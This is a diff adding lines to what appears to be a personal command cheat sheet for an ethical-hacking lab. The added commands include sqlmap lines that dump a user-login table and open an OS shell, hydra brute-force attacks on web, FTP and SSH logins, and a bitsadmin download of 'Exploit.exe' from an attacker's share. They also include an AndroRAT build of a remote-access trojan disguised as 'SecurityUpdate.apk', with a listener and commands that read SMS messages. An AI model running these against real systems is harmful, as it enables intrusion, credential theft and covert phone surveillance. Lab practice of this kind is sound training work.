@@ -16,14 +16,56 @@ tshark -r ~/Documents/And_Dos.pcapng -q -z expert
 
 
 
+Hosting Information: 
+nc -vv www.moviescope.com 80
+GET / HTTP/1.0
+
+
+Banner Grabbing: 
+telnet www.moviescope.com 80
+GET / HTTP/1.0
+
+
+SQLi:
+document.cookie
+sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="[cookie value that you copied in Step#7]" --dbs
+sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="[cookie value which you have copied in Step#7]" -D moviescope --tables
+sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="[cookie value which you have copied in Step#7]" -D moviescope -T User_Login --dump
+sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="[cookie value which you have copied in Step#7]" --os-shell
+
+
+hydra -l adam -P rockyou.txt target_ip http-post-form "/login.php:user=^USER^&pass=^PASS^:F=incorrect"
+hydra -L /home/attacker/Desktop/Wordlists/Usernames.txt -P /home/attacker/Desktop/Wordlists/Passwords.txt ftp://
+hydra -L /home/attacker/Desktop/Wordlists/Usernames.txt -P /home/attacker/Desktop/Wordlists/Passwords.txt ssh://
+
+
+smbclient -L //192.168.10.101
+
 sha256sum ~/Downloads/Tools.rar
+
+
+File Sharing:
+mkdir /var/www/html/share
+chmod -R 755 /var/www/html/share
+chown -R www-data:www-data /var/www/html/share
+bitsadmin /transfer Exploit.exe http://10.10.1.13/share/Exploit.exe c:\Exploit.exe
 
 ent ~/Downloads/Tornado.elf
 
+
 find / -type f -name "*.apk" 2>/dev/null
+
 
 steghide extract -sf ~/Desktop/stealth.jpeg
 
+
+veracrypt ~/Documents/secret /mnt/vera
+
+
+python3 androRAT.py --build -i 10.10.1.13 -p 4444 -o SecurityUpdate.apk
+python3 androRAT.py --shell -i 0.0.0.0 -p 4444
+deviceInfo 
+getSMS inbox
 
 
 
